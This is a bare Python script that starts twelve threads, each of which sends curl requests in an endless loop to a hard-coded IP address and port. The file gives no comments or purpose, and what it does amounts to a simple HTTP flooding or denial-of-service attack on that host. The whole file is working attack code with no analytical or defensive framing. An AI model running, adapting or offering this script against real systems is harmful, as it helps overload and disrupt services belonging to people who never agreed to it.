import os
import threading
def a():
  while True:
   os.system("curl http://65.2.152.89:8081/")

x = threading.Thread(target = a)
x1 = threading.Thread(target = a)
x2 = threading.Thread(target = a)
x3 = threading.Thread(target = a)
x4 = threading.Thread(target = a)
x5 = threading.Thread(target = a)

x6 = threading.Thread(target = a)
x7 = threading.Thread(target = a)
x8 = threading.Thread(target = a)
x9 = threading.Thread(target = a)
x10 = threading.Thread(target = a)
x11 = threading.Thread(target = a)

x.start()
x1.start()
x2.start()
x3.start()
x4.start()
x5.start()

x6.start()
x7.start()
x8.start()
x9.start()
x10.start()
x11.start()
